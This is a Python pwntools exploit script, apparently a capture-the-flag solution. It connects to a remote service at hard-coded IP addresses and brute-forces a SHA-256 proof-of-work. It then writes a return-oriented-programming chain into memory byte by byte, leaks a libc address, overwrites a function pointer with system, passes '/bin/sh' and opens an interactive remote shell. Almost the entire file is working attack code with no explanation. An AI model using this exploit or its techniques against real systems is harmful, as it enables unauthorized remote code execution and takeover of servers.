from pwn import *
import hashlib
from string import digits,letters
import random


context.arch = "amd64"

#r = remote("47.75.9.127", 9999)
r = remote("47.100.96.94", 9999)

data = r.recvline()

substr = data.split(')')[0].split('+')[1]
ans = data.split()[-1].strip()
total = digits+letters
total*=4
total = list(total)
#print total
count = 0
while True:
        count +=1
        if count %100000 == 0:
                print count
        sol = "".join(random.sample(total,4))
        if hashlib.sha256( sol+substr).hexdigest() == ans:
                print "OK"
                r.sendlineafter(":",sol)
                break


#r = remote("localhost",10001)

r.sendlineafter(":",str(0xd0))

def change(size,content):
	r.sendlineafter(":","\x20"*size+content)
def write():
	r.sendlineafter(":","\x20"*(0x20))



#0x0000000000400973 : pop rdi ; ret
#puts  0x4005b0


mapss = flat([0x0,0x0400973,0x0601018,0x4005b0,0x40096a,0x0,0x1,0x601028,0x10,0x601100,0x0,
0x400950,0x0,0x0,0x1,0x601100,0x0,0x0,0x601108,0x400950])
change(0x100,p64(0x2028)[:2])
change(0x30,p64(0x2028)[:2])


for i in range(len(mapss)-1,-1,-1):
	if i%10 == 0:
		print i
	for _ in range(ord(mapss[i])):
		#print "OOO"
		change( 0x30,p64(0x2028+i)[:2])
		write()


change(0x30,p64(0x2020)[:2])
r.sendline("")

print r.recvline()
print r.recvline()

libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x6f690

print hex(libc)

system = 0x45390+libc

r.send(p64(system)+"/bin/sh\x00")


r.interactive()


